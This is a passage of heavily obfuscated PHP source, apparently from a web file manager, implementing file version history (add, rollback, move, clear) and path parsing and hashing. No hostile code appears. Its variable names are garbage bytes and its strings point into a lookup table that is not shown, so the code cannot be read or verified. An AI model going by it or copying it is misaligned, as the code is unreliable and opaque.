parsePath($Ò»Ğí’²) { $â¼íÚë =& $_SERVER[‰‰Ş‚€]; if (!$Ò»Ğí’²) { return !1; } if (isset($GLOBALS[$â¼íÚë[1356]]) && $GLOBALS[$â¼íÚë[1356]]) { return; } $ˆœ‚‰Æ° = KodIO::parse($Ò»Ğí’²); $ô›èÀå = $ˆœ‚‰Æ°[$â¼íÚë[43]]; $ˆ¥¤¸ŸÔ = !$ô›èÀå || $ô›èÀå == KodIO::KOD_IO || $ô›èÀå == KodIO::KOD_SHARE_ITEM; if (!$ˆ¥¤¸ŸÔ || !$ˆœ‚‰Æ°[$â¼íÚë[1357]]) { return !1; } if (substr($Ò»Ğí’², 0, strlen(DATA_PATH . $â¼íÚë[1358])) == DATA_PATH . $â¼íÚë[1358]) { return !1; } if ($ô›èÀå == KodIO::KOD_SHARE_ITEM) { $Éä†£´­ = IO::init($Ò»Ğí’²); if ($Éä†£´­->pathParse[$â¼íÚë[1269]]) { return self::parsePath($Éä†£´­->pathParse[$â¼íÚë[1269]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ù˜“ê»¶ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $â¼íÚë[1359]); foreach ($Ù˜“ê»¶ as $‚ŸîéâÅ) { if (!$ô›èÀå && substr($Ò»Ğí’², 0, strlen($‚ŸîéâÅ)) == $‚ŸîéâÅ) { return !1; } } self::log($GLOBALS[$â¼íÚë[1263]] . $â¼íÚë[1360] . $Ò»Ğí’²); return $Ò»Ğí’²; } private static function pathHistory($—ˆ¿Õ­¦) { $÷Èå¶–¿ =& $_SERVER[‰‰Ş‚€]; $ëìĞºŸ¦ = self::$_historyBase . ltrim(KodIO::clear($—ˆ¿Õ­¦), $÷Èå¶–¿[18]); $ëìĞºŸ¦ = str_replace(array($÷Èå¶–¿[1361]), array($÷Èå¶–¿[1362]), $ëìĞºŸ¦); return $ëìĞºŸ¦; } public static function log($—Ø‹˜Ùñ) { } public static function historyCount($Æ“‰ÔŸ) { $“ô…£ =& $_SERVER[‰‰Ş‚€]; $ŸÛõÁÓè = array(); $•ª§Û²å = array(); foreach ($Æ“‰ÔŸ as $Î´é‚àË) { $ Ì¯«á = get_path_father($Î´é‚àË); if (!$•ª§Û²å[$ Ì¯«á]) { $•ª§Û²å[$ Ì¯«á] = array(); } $•ª§Û²å[$ Ì¯«á][] = get_path_this($Î´é‚àË); } foreach ($•ª§Û²å as $ Ì¯«á => $¦ääÈµ¤) { $òØ¾Ğ ¹ = self::parsePath($ Ì¯«á); if (!$òØ¾Ğ ¹) { continue; } foreach ($¦ääÈµ¤ as $öÓ ©ç) { $Î£ºîµà = self::listData(rtrim($òØ¾Ğ ¹, $“ô…£[18]) . $“ô…£[18] . $öÓ ©ç, !1); if ($Î£ºîµà && $Î£ºîµà[$“ô…£[454]]) { $ŸÛõÁÓè[rtrim($ Ì¯«á, $“ô…£[18]) . $“ô…£[18] . $öÓ ©ç] = count($Î£ºîµà[$“ô…£[454]]); } } } return $ŸÛõÁÓè; } public static function add($·È ï) { $Ì½àëƒû =& $_SERVER[‰‰Ş‚€]; $êæüÇù = self::listData($·È ï); if (!$êæüÇù) { return; } $¤êÙÜ· = Model($Ì½àëƒû[869])->get($Ì½àëƒû[1363]); $Œ¤°àßš = intval($GLOBALS[$Ì½àëƒû[16]][$Ì½àëƒû[102]][$Ì½àëƒû[1341]]); $Ê÷ÇíÏ = $¤êÙÜ· == $Ì½àëƒû[1364] ? min(5, $Œ¤°àßš) : $Œ¤°àßš; if ($Œ¤°àßš <= 0) { return; } $œŠÅ£µ‹ = IO::info($·È ï); $·®¤ó¿ö = $êæüÇù[$Ì½àëƒû[454]]; if ($œŠÅ£µ‹[$Ì½àëƒû[89]] == 0) { return; } if ($œŠÅ£µ‹[$Ì½àëƒû[89]] >= 1024 * 1024 * 500) { return !1; } $šÕ¾øš = IO::hashSimple($·È ï); if ($·®¤ó¿ö && $·®¤ó¿ö[0][$Ì½àëƒû[695]] == $šÕ¾øš) { return !0; } if (array_key_exists($Ì½àëƒû[244], $œŠÅ£µ‹) && !$œŠÅ£µ‹[$Ì½àëƒû[244]]) { return !1; } $Ñ¢¦›—É = short_id(time()); $¬Òâ¿ì = array($Ì½àëƒû[491] => $Ñ¢¦›—É, $Ì½àëƒû[695] => $šÕ¾øš, $Ì½àëƒû[42] => $œŠÅ£µ‹[$Ì½àëƒû[42]] . $Ì½àëƒû[20] . date($Ì½àëƒû[1365]) . rand_string(1), $Ì½àëƒû[89] => $œŠÅ£µ‹[$Ì½àëƒû[89]], $Ì½àëƒû[545] => USER_ID, $Ì½àëƒû[242] => time(), $Ì½àëƒû[1366] => $Ì½àëƒû[22]); IO::mkdir($êæüÇù[$Ì½àëƒû[1367]]); $Ï¿¾¿£Ù = IO::copy($·È ï, $êæüÇù[$Ì½àëƒû[1367]], !1, $¬Òâ¿ì[$Ì½àëƒû[42]]); if (!$Ï¿¾¿£Ù) { self::clearEmptyFolder($êæüÇù[$Ì½àëƒû[1367]]); return !1; } array_unshift($·®¤ó¿ö, $¬Òâ¿ì); if (count($·®¤ó¿ö) > $Ê÷ÇíÏ) { $ç‰÷¬ñ = array_slice($·®¤ó¿ö, $Ê÷ÇíÏ); foreach ($ç‰÷¬ñ as $ÏŞÕ“À³) { IO::remove($êæüÇù[$Ì½àëƒû[1367]] . $ÏŞÕ“À³[$Ì½àëƒû[42]]); } $·®¤ó¿ö = array_slice($·®¤ó¿ö, 0, $Ê÷ÇíÏ); } return self::saveData($êæüÇù[$Ì½àëƒû[1368]], $·®¤ó¿ö); } public static function remove($ÚÑüÕõ, $ïõº­™®) { $¿ã£©­ =& $_SERVER[‰‰Ş‚€]; $Ç»È–Ù€ = self::listData($ÚÑüÕõ); $ÔäµÎøÄ = array(); if (!$Ç»È–Ù€) { return !1; } foreach ($Ç»È–Ù€[$¿ã£©­[454]] as $íˆİ›‰•) { if ($íˆİ›‰•[$¿ã£©­[491]] == $ïõº­™®) { IO::remove($Ç»È–Ù€[$¿ã£©­[1367]] . $íˆİ›‰•[$¿ã£©­[42]]); continue; } $ÔäµÎøÄ[] = $íˆİ›‰•; } return self::saveData($Ç»È–Ù€[$¿ã£©­[1368]], $ÔäµÎøÄ); } public static function clear($áÖ…“±Ü, $Ñß¿éó = true) { $ƒ¢±ï =& $_SERVER[‰‰Ş‚€]; $ç¾£õ = self::listData($áÖ…“±Ü, $Ñß¿éó); if (!$ç¾£õ) { return !1; } foreach ($ç¾£õ[$ƒ¢±ï[454]] as $óùÚûæœ) { IO::remove($ç¾£õ[$ƒ¢±ï[1367]] . $óùÚûæœ[$ƒ¢±ï[42]]); } return self::saveData($ç¾£õ[$ƒ¢±ï[1368]], array()); } public static function moveHistory($®ÖâÙÄ, $Ë¥ĞĞŒä = '', $ÙÓ„ññ = '') { $Øâùê¼ß =& $_SERVER[‰‰Ş‚€]; $•æ¶Å¾Á = self::listData($®ÖâÙÄ, !1); if (!$•æ¶Å¾Á || !$•æ¶Å¾Á[$Øâùê¼ß[454]]) { return !1; } $‘ú³òíÈ = $Øâùê¼ß[1355]; $Ë¥ĞĞŒä = $Ë¥ĞĞŒä ? $Ë¥ĞĞŒä : get_path_this($®ÖâÙÄ); $ÙÓ„ññ = $ÙÓ„ññ ? $ÙÓ„ññ : $•æ¶Å¾Á[$Øâùê¼ß[1367]]; $÷âıØ·¯ = substr(get_path_this($•æ¶Å¾Á[$Øâùê¼ß[1368]]), 0, -strlen($‘ú³òíÈ)); foreach ($•æ¶Å¾Á[$Øâùê¼ß[454]] as $ê‘ûßÖ => $—ş”ğÁĞ) { $êˆº×é– = $Ë¥ĞĞŒä . substr($—ş”ğÁĞ[$Øâùê¼ß[42]], strlen($÷âıØ·¯)); $Ú•¨Ë‡ = IO::move($•æ¶Å¾Á[$Øâùê¼ß[1367]] . $—ş”ğÁĞ[$Øâùê¼ß[42]], $ÙÓ„ññ, !1, $êˆº×é–); if ($Ú•¨Ë‡) { $•æ¶Å¾Á[$Øâùê¼ß[454]][$ê‘ûßÖ][$Øâùê¼ß[42]] = $êˆº×é–; } } $•æ¶Å¾Á[$Øâùê¼ß[1368]] = IO::move($•æ¶Å¾Á[$Øâùê¼ß[1368]], $ÙÓ„ññ, !1, $Ë¥ĞĞŒä . $‘ú³òíÈ); self::saveData($•æ¶Å¾Á[$Øâùê¼ß[1368]], $•æ¶Å¾Á[$Øâùê¼ß[454]]); self::clearEmptyFolder($•æ¶Å¾Á[$Øâùê¼ß[1367]]); } public static function rollback($¨¶ °Ç, $‹ãŒ„Ğ£) { $ÂĞŠˆ¡â =& $_SERVER[‰‰Ş‚€]; $™½Ëèª = self::listData($¨¶ °Ç); if (!$™½Ëèª) { return; } $´Â·öç = IO::info($¨¶ °Ç); foreach ($™½Ëèª[$ÂĞŠˆ¡â[454]] as $ÒŞÂ¸Öø => $¾ìˆŒ˜) { if ($¾ìˆŒ˜[$ÂĞŠˆ¡â[491]] == $‹ãŒ„Ğ£) { self::add($¨¶ °Ç); $Š˜°Úæ = $™½Ëèª[$ÂĞŠˆ¡â[1367]] . $¾ìˆŒ˜[$ÂĞŠˆ¡â[42]]; $©ø¼¤¦à = IO::copy($Š˜°Úæ, IO::pathFather($¨¶ °Ç), REPEAT_REPLACE, $´Â·öç[$ÂĞŠˆ¡â[42]]); if ($©ø¼¤¦à) { self::remove($¨¶ °Ç, $‹ãŒ„Ğ£); } return $©ø¼¤¦à; } } return !1; } public static function setDetail($¾øäÆ™, $ç»—ë£¨, $¦á²„¸§) { $şá×µ¨’ =& $_SERVER[‰‰Ş‚€]; $íÏËÇï¹ = self::listData($¾øäÆ™); if (!$íÏËÇï¹) { return; } foreach ($íÏËÇï¹[$şá×µ¨’[454]] as $¯ÖÏÛÊ¯ => $§Æ â‡) { if ($§Æ â‡[$şá×µ¨’[491]] == $ç»—ë£¨) { $íÏËÇï¹[$şá×µ¨’[454]][$¯ÖÏÛÊ¯][$şá×µ¨’[1366]] = $¦á²„¸§; self::saveData($íÏËÇï¹[$şá×µ¨’[1368]], $íÏËÇï¹[$şá×µ¨’[454]]); return !0; } } return !1; } public static function fileInfo($œâ†ì§, $Û¡î±å) { $×¸¯¬ =& $_SERVER[‰‰Ş‚€]; $á˜Óˆ™ = self::listData($œâ†ì§); if (!$á˜Óˆ™) { show_json(LNG($×¸¯¬[116]), !1); } $ŸŞæœÔ = $×¸¯¬[22]; foreach ($á˜Óˆ™[$×¸¯¬[454]] as $ØÁı•¨† => $¯†¿õš—) { if ($¯†¿õš—[$×¸¯¬[491]] != $Û¡î±å) { continue; } $ŸŞæœÔ = $á˜Óˆ™[$×¸¯¬[1367]] . $¯†¿õš—[$×¸¯¬[42]]; break; } if (!$ŸŞæœÔ) { show_json(LNG($×¸¯¬[116]), !1); } return IO::info($ŸŞæœÔ); } public static function fileOut($Û©ôÂó¿, $ Ã»¸÷è, $öÉâÃËù = false) { $©¼À•›ı =& $_SERVER[‰‰Ş‚€]; $³ÅíË‘î = self::fileInfo($Û©ôÂó¿, $ Ã»¸÷è); $ğ­ôÃÖß =& $GLOBALS[$©¼À•›ı[17]]; $öÉâÃËù = isset($ğ­ôÃÖß[$©¼À•›ı[1318]]) && $ğ­ôÃÖß[$©¼À•›ı[1318]] == 1; if (isset($ğ­ôÃÖß[$©¼À•›ı[43]]) && $ğ­ôÃÖß[$©¼À•›ı[43]] == $©¼À•›ı[1369]) { return IO::fileOutImage($³ÅíË‘î[$©¼À•›ı[97]], $ğ­ôÃÖß[$©¼À•›ı[1370]]); } IO::fileOut($³ÅíË‘î[$©¼À•›ı[97]], $öÉâÃËù, get_path_this($Û©ôÂó¿)); } public static function listData($óõî•ì, $‘ä§Íˆ = true) { $Ø™µó¯ =& $_SERVER[‰‰Ş‚€]; if ($‘ä§Íˆ && !IO::exist($óõî•ì)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($óõî•ì, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ò®¥ûô„ = self::pathHistory($óõî•ì); $¸ıÉØŞ = array($Ø™µó¯[1368] => $Ò®¥ûô„ . $Ø™µó¯[1355], $Ø™µó¯[1367] => rtrim(get_path_father($Ò®¥ûô„), $Ø™µó¯[18]) . $Ø™µó¯[18], $Ø™µó¯[454] => array()); $¤ÇÈÕü = IO::getContent($¸ıÉØŞ[$Ø™µó¯[1368]]); if ($¤ÇÈÕü) { $¶Ö¼öïå = json_decode($¤ÇÈÕü, !0); if (is_array($¶Ö¼öïå)) { $¸ıÉØŞ[$Ø™µó¯[454]] = $¶Ö¼öïå; } } return $¸ıÉØŞ; } private static function saveData($Šî‚’ä, $—í¸ğ‘Ò) { $±‰…Ú =& $_SERVER[‰‰Ş‚€]; self::log($±‰…Ú[1371] . $Šî‚’ä . $±‰…Ú[84] . count($—í¸ğ‘Ò), $±‰…Ú[848]); if ($—í¸ğ‘Ò) { return IO::setContent($Šî‚’ä, json_encode($—í¸ğ‘Ò)); } $¯ôõ˜ÚÁ = IO::pathFather($Šî‚’ä); IO::remove($Šî‚’ä); self::clearEmptyFolder($¯ôõ˜ÚÁ); return !0; } public static function clearEmptyFolder($üü¥£˜¼) { $…ø¦ñêä =& $_SERVER[‰‰Ş‚€]; if (trim($üü¥£˜¼, $…ø¦ñêä[18]) == trim(self::$_historyBase, $…ø¦ñêä[18])) { return; } $ïÜÓ”‚´ = IO::pathFather($üü¥£˜¼); $åò°Öø® = IO::has($üü¥£˜¼, !0); if ($åò°Öø®[$…ø¦ñêä[250]] > 0 || $åò°Öø®[$…ø¦ñêä[251]] > 0) { return; } IO::remove($üü¥£˜¼); self::clearEmptyFolder($ïÜÓ”‚´); } private static function getBasePath() { $Ğ¼êíî¾ =& $_SERVER[‰‰Ş‚€]; $æÑÔ¼Ü = Model($Ğ¼êíî¾[1372])->get($Ğ¼êíî¾[1373]); if ($æÑÔ¼Ü) { if (!IO::exist($æÑÔ¼Ü)) { IO::mkdir($æÑÔ¼Ü); } if (get_path_this($æÑÔ¼Ü) == $Ğ¼êíî¾[1358]) { $Û©Ùéœ‡ = $Ğ¼êíî¾[1374] . rand_string(8); @rename($æÑÔ¼Ü, get_path_father($æÑÔ¼Ü) . $Ğ¼êíî¾[18] . $Û©Ùéœ‡); $æÑÔ¼Ü = DATA_PATH . $Û©Ùéœ‡ . $Ğ¼êíî¾[18]; file_put_contents(DATA_PATH . $Ğ¼êíî¾[1305], $Ğ¼êíî¾[22]); Model($Ğ¼êíî¾[1372])->set($Ğ¼êíî¾[1373], $æÑÔ¼Ü); } return $æÑÔ¼Ü; } $æÑÔ¼Ü = DATA_PATH . $Ğ¼êíî¾[1374] . rand_string(8) . $Ğ¼êíî¾[18]; $æÑÔ¼Ü = IO::mkdir($æÑÔ¼Ü); $æÑÔ¼Ü = rtrim($æÑÔ¼Ü, $Ğ¼êíî¾[18]) . $Ğ¼êíî¾[18]; file_put_contents($æÑÔ¼Ü . $Ğ¼êíî¾[1305], $Ğ¼êíî¾[22]); file_put_contents(DATA_PATH . $Ğ¼êíî¾[1305], $Ğ¼êíî¾[22]); Model($Ğ¼êíî¾[1372])->set($Ğ¼êíî¾[1373], $æÑÔ¼Ü); return $æÑÔ¼Ü; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\x52\145\143\x79\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\163\145\x72\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\162\106\x69\x6c\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\x46\151\x6c\x65\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\160\122\157\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\150\141\x72\145\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\x65\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\x65\x49\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\145\111\x74\x65\155\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\173\163\x65\141\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\122\145\x6e\x63\145\156\164\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\145\162\x7d"; public static function typeList() { $õªÁ­è =& $_SERVER[‰‰Ş‚€]; return array($õªÁ­è[1375] => self::KOD_SOURCE, $õªÁ­è[1376] => self::KOD_USER_RECYCLE, $õªÁ­è[1377] => self::KOD_USER_FAV, $õªÁ­è[1378] => self::KOD_USER_FILE_TAG, $õªÁ­è[1379] => self::KOD_USER_FILE_TYPE, $õªÁ­è[1380] => self::KOD_GROUP_ROOT_SELF, $õªÁ­è[1381] => self::KOD_USER_SHARE, $õªÁ­è[1382] => self::KOD_USER_SHARE_LINK, $õªÁ­è[1383] => self::KOD_USER_SHARE_TO_ME, $õªÁ­è[1384] => self::KOD_SHARE_ITEM, $õªÁ­è[1385] => self::KOD_SHARE_LINK, $õªÁ­è[1386] => self::KOD_SEARCH, $õªÁ­è[1387] => self::KOD_BLOCK, $õªÁ­è[1388] => self::KOD_IO, $õªÁ­è[1389] => self::KOD_USER_RECENT, $õªÁ­è[1390] => self::KOD_USER_DRIVER); } public static function parse($ºî®µëº) { $™´¹ÇÍ =& $_SERVER[‰‰Ş‚€]; $ºî®µëº = self::clear($ºî®µëº); $û§¬»½µ = array_values(self::typeList()); preg_match($™´¹ÇÍ[1391], $ºî®µëº, $µÙÚøä±); $ÔÍÈÅëí = array($™´¹ÇÍ[515] => !1, $™´¹ÇÍ[1392] => !1, $™´¹ÇÍ[512] => !1, $™´¹ÇÍ[97] => $ºî®µëº, $™´¹ÇÍ[1289] => !1, $™´¹ÇÍ[1288] => $™´¹ÇÍ[22]); if (is_array($µÙÚøä±) && count($µÙÚøä±) == 5) { $´³˜€Ìß = $™´¹ÇÍ[1393] . $µÙÚøä±[2] . $™´¹ÇÍ[411]; if (in_array($´³˜€Ìß, $û§¬»½µ)) { $ÔÍÈÅëí[$™´¹ÇÍ[1289]] = $µÙÚøä±[1]; $ÔÍÈÅëí[$™´¹ÇÍ[43]] = $´³˜€Ìß; $ÔÍÈÅëí[$™´¹ÇÍ[1394]] = substr($´³˜€Ìß, 1, -1); $ÔÍÈÅëí[$™´¹ÇÍ[491]] = $µÙÚøä±[3]; } $ÔÍÈÅëí[$™´¹ÇÍ[1288]] = $µÙÚøä±[4]; } if ($ÔÍÈÅëí[$™´¹ÇÍ[515]] == self::KOD_SOURCE) { $ÔÍÈÅëí[$™´¹ÇÍ[491]] = intval($ÔÍÈÅëí[$™´¹ÇÍ[491]]); $ÔÍÈÅëí[$™´¹ÇÍ[1292]] = $ÔÍÈÅëí[$™´¹ÇÍ[491]]; } $ Ÿô•ß  = array($™´¹ÇÍ[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÔÍÈÅëí[$™´¹ÇÍ[1357]] = in_array($ÔÍÈÅëí[$™´¹ÇÍ[43]], $ Ÿô•ß ); return $ÔÍÈÅëí; } public static function isTruePath($óÃ„¼ûƒ) { $§à‹Ìß =& $_SERVER[‰‰Ş‚€]; if (substr($óÃ„¼ûƒ, 0, 1) != $§à‹Ìß[1393]) { return !0; } if (strpos($óÃ„¼ûƒ, $§à‹Ìß[502]) === 0) { return !0; } if (strpos($óÃ„¼ûƒ, $§à‹Ìß[1361]) === 0) { return !0; } if (strpos($óÃ„¼ûƒ, $§à‹Ìß[1395]) === 0) { return !0; } if (strpos($óÃ„¼ûƒ, $§à‹Ìß[1396]) === 0) { return !0; } if (strpos($óÃ„¼ûƒ, $§à‹Ìß[1397]) === 0) { return !0; } return !1; } public static function clear($¿³‰×É) { $“ßùƒš =& $_SERVER[‰‰Ş‚€]; $¿³‰×É = str_replace(array($“ßùƒš[1190], $“ßùƒš[10]), $“ßùƒš[63], $¿³‰×É); $¿³‰×É = str_replace($“ßùƒš[108], $“ßùƒš[18], $¿³‰×É); $É¾¼¤¡Õ = $“ßùƒš[1398]; if (substr($¿³‰×É, 0, 3) == $“ßùƒš[1399]) { $¿³‰×É = substr($¿³‰×É, 3); } while (strstr($¿³‰×É, $É¾¼¤¡Õ)) { $¿³‰×É = str_replace($É¾¼¤¡Õ, $“ßùƒš[18], $¿³‰×É); } $¿³‰×É = preg_replace($“ßùƒš[1400], $“ßùƒš[18], $¿³‰×É); if ($¿³‰×É == $“ßùƒš[18]) { return $“ßùƒš[18]; } $¿³‰×É = rtrim($¿³‰×É, $“ßùƒš[18]); return $¿³‰×É; } public static function pathTrue($ÆéÍğñ) { $ÚÉ€€¥Í =& $_SERVER[‰‰Ş‚€]; if (!$ÆéÍğñ) { return $ÚÉ€€¥Í[22]; } $ÆéÍğñ = str_replace($ÚÉ€€¥Í[265], $ÚÉ€€¥Í[18], str_replace($ÚÉ€€¥Í[1401], $ÚÉ€€¥Í[18], $ÆéÍğñ)); $ÆéÍğñ = str_replace($ÚÉ€€¥Í[265], $ÚÉ€€¥Í[18], str_replace($ÚÉ€€¥Í[1401], $ÚÉ€€¥Í[18], $ÆéÍğñ)); if (!strstr($ÆéÍğñ, $ÚÉ€€¥Í[1399])) { return $ÆéÍğñ; } $ä—ğŒû = explode($ÚÉ€€¥Í[18], $ÆéÍğñ); foreach ($ä—ğŒû as $şÖ»Êã¦ => $öììöñç) { if ($öììöñç !== $ÚÉ€€¥Í[1402]) { continue; } for ($ğ²–Œİ¸ = $şÖ»Êã¦; $ğ²–Œİ¸ >= 0; $ğ²–Œİ¸--) { if ($ä—ğŒû[$ğ²–Œİ¸] === $ÚÉ€€¥Í[20] || $ä—ğŒû[$ğ²–Œİ¸] === $ÚÉ€€¥Í[1402] || $ä—ğŒû[$ğ²–Œİ¸] === -1) { continue; } if ($ä—ğŒû[$ğ²–Œİ¸] === $ÚÉ€€¥Í[22]) { $ä—ğŒû[$şÖ»Êã¦] = -1; break; } $ä—ğŒû[$şÖ»Êã¦] = -1; $ä—ğŒû[$ğ²–Œİ¸] = -1; break; } } $‚ëİµŒü = array(); foreach ($ä—ğŒû as $öììöñç) { if ($öììöñç !== -1) { $‚ëİµŒü[] = $öììöñç; } } $à©€¦¢ï = implode($ÚÉ€€¥Í[18], $‚ëİµŒü); if (strpos($à©€¦¢ï, $ÚÉ€€¥Í[1403]) === 0) { $à©€¦¢ï = $ÚÉ€€¥Í[1399] . substr($à©€¦¢ï, strlen($ÚÉ€€¥Í[1403])); } return $à©€¦¢ï; } public static function pathUrlClear($åÈ… Ï) { $ßâ¦ïñí =& $_SERVER[‰‰Ş‚€]; if (!$åÈ… Ï) { return $åÈ… Ï; } $åÈ… Ï = rawurldecode($åÈ… Ï); $åÈ… Ï = str_replace($ßâ¦ïñí[1401], $ßâ¦ïñí[18], $åÈ… Ï); if (strpos($åÈ… Ï, $ßâ¦ïñí[86]) > 0) { $åÈ… Ï = substr($åÈ… Ï, 0, strpos($åÈ… Ï, $ßâ¦ïñí[86])); } if (strpos($åÈ… Ï, $ßâ¦ïñí[1404]) > 0) { $åÈ… Ï = substr($åÈ… Ï, 0, strpos($åÈ… Ï, $ßâ¦ïñí[1404])); } return $åÈ… Ï; } public static function sourceID($ª§±ãøì) { $²í”‘’ =& $_SERVER[‰‰Ş‚€]; $â©ìà¯½ = self::parse($ª§±ãøì); if ($â©ìà¯½[$²í”‘’[43]] !== self::KOD_SOURCE) { show_json(LNG($²í”‘’[1405]), !1); } return $â©ìà¯½[$²í”‘’[491]]; } public static function make($—åöø½é) { if (!$—åöø½é) { return !1; } return self::makePath(self::KOD_SOURCE, intval($—åöø½é)); } public static function makeShare($˜Ÿ¯Ã«, $™¬ìĞ Ï) { return self::makePath(self::KOD_SHARE_ITEM, $˜Ÿ¯Ã«, $™¬ìĞ Ï); } public static function makeFileTypePath($ğË¿çÔ‹) { return self::makePath(self::KOD_USER_FILE_TYPE, $ğË¿çÔ‹); } public static function makeFileTagPath($ÑŒª‰å‹) { return self::makePath(self::KOD_USER_FILE_TAG, $ÑŒª‰å‹); } public static function makePath($ö´©›ôÛ, $Ìß„å†ø = '', $ÈË½©¡Â = '') { $ÜäÍ´Ï¾ =& $_SERVER[‰‰Ş‚€]; $·–ùáÚ = substr($ö´©›ôÛ, 1, -1); $²˜êå­ç = $ÜäÍ´Ï¾[1406] . $·–ùáÚ . $ÜäÍ´Ï¾[1407] . $Ìß„å†ø . $ÜäÍ´Ï¾[1408]; $²˜êå­ç = $ÈË½©¡Â ? $²˜êå­ç . $ÈË½©¡Â . $ÜäÍ´Ï¾[18] : $²˜êå­ç; return $²˜êå­ç; } public static function hashPath($§Ù¼¾Ú‰, $—©Ù²¶© = false) { $‘Äê¯ıÄ =& $_SERVER[‰‰Ş‚€]; if (!$§Ù¼¾Ú‰) { return $‘Äê¯ıÄ[22]; } $ÂÁÂ™×– = is_array($§Ù¼¾Ú‰) ? $§Ù¼¾Ú‰ : IO::info($§Ù¼¾Ú‰); $‰½¹À— = _get($ÂÁÂ™×–, $‘Äê¯ıÄ[1409], $‘Äê¯ıÄ[22]); if (!$‰½¹À— && isset($ÂÁÂ™×–[$‘Äê¯ıÄ[561]])) { $‰½¹À— = $ÂÁÂ™×–[$‘Äê¯ıÄ[561]]; } if (!$‰½¹À— && isset($ÂÁÂ™×–[$‘Äê¯ıÄ[246]])) { $‰½¹À— = trim($ÂÁÂ™×–[$‘Äê¯ıÄ[246]], $‘Äê¯ıÄ[129]); } if ($‰½¹À—) { return $‰½¹À—; } if (!$‰½¹À— && isset($ÂÁÂ™×–[$‘Äê¯ıÄ[202]]) && $ÂÁÂ™×–[$‘Äê¯ıÄ[202]]) { $ÂÁÂ™×– = IO::info(KodIO::make($ÂÁÂ™×–[$‘Äê¯ıÄ[202]])); $‰½¹À— = _get($ÂÁÂ™×–, $‘Äê¯ıÄ[1409], $‘Äê¯ıÄ[22]); if (!$‰½¹À— && isset($ÂÁÂ™×–[$‘Äê¯ıÄ[561]])) { $‰½¹À— = $ÂÁÂ™×–[$‘Äê¯ıÄ[561]]; } } $şİØ¿‘Î = md5($ÂÁÂ™×–[$‘Äê¯ıÄ[97]] . $ÂÁÂ™×–[$‘Äê¯ıÄ[89]] . $ÂÁÂ™×–[$‘Äê¯ıÄ[98]]); $çèñÑ¯Á = $şİØ¿‘Î . $‘Äê¯ıÄ[1410]; $‰½¹À— = $‰½¹À— ? $‰½¹À— : Cache::get($çèñÑ¯Á); if (!$‰½¹À— && $—©Ù²¶©) { $‰½¹À— = IO::hashSimple($ÂÁÂ™×–[$‘Äê¯ıÄ[97]]); Cache::set($çèñÑ¯Á, $‰½¹À— ? $‰½¹À— : $şİØ¿‘Î, 3600 * 24 * 30); } return $‰½¹À— ? $‰½¹À— : $şİØ¿‘Î; } public static function hashPathSafe($¾øîÓçà, $‡ã†ğÎ = false) { $‹ö¡Êş¬ =& $_SERVER[‰‰Ş‚€]; $ÈÎı‡Êµ = self::hashPath($¾øîÓçà, $‡ã†ğÎ); return md5($ÈÎı‡Êµ . $‹ö¡Êş¬[1411] . Model($‹ö¡Êş¬[869])->get($‹ö¡Êş¬[870])); } public static function initSystemPath() { $ß˜ÌÔğõ =& $_SERVER[‰‰Ş‚€]; if (defined($ß˜ÌÔğõ[1412])) { return; } define($ß˜ÌÔğõ[1412], self::systemPath($ß˜ÌÔğõ[200])); define($ß˜ÌÔğõ[1413], self::systemPath($ß˜ÌÔğõ[1414])); define($ß˜ÌÔğõ[1415], self::systemPath($ß˜ÌÔğõ[1416])); define($ß˜ÌÔğõ[1417], self::systemPath($ß˜ÌÔğõ[1418])); IOHistory::bindEvent(); } public static function systemPath($ë‚Œ¥Ç÷) { $ç‘†ßê´ =& $_SERVER[‰‰Ş‚€]; $íşôôÂÒ = $ç‘†ßê´[1419] . ucfirst($ë‚Œ¥Ç÷); $ëÁİ€øğ = Model($ç‘†ßê´[869])->get($íşôôÂÒ); if ($ëÁİ€øğ) { return $ëÁİ€øğ; } if ($ë‚Œ¥Ç÷ == $ç‘†ßê´[200]) { $ëÁİ€øğ = self::make(Model($ç‘†ßê´[929])->systemRootPathAdd($ç‘†ßê´[628])); } else { $ëÁİ€øğ = self::systemPath($ç‘†ßê´[200]); $•Æí÷Óï = self::sourceID($ëÁİ€øğ); $ëÁİ€øğ = self::make(Model($ç‘†ßê´[929])->mkdir($•Æí÷Óï, $ë‚Œ¥Ç÷)); } Model($ç‘†ßê´[869])->set($íşôôÂÒ, $ëÁİ€øğ); return $ëÁİ€øğ; } public static function systemFolder($Õ–¹Ùş¹) { $·ûÃŸ¼É = IO_PATH_SYSTEM_SOURCE . $Õ–¹Ùş¹; $ÖÃ—³ÜÍ = Cache::get($·ûÃŸ¼É); if (!$ÖÃ—³ÜÍ) { $ëÇ«Œê— = IO::infoFullSimple($·ûÃŸ¼É); if (!$ëÇ«Œê—) { $ÖÃ—³ÜÍ = IO::mkdir($·ûÃŸ¼É, REPEAT_SKIP); } else { $ÖÃ—³ÜÍ = $ëÇ«Œê—[$_SERVER[‰‰Ş‚€][97]]; } Cache::set($·ûÃŸ¼É, $ÖÃ—³ÜÍ, 3600 * 10); } return $ÖÃ—³ÜÍ; } public static function 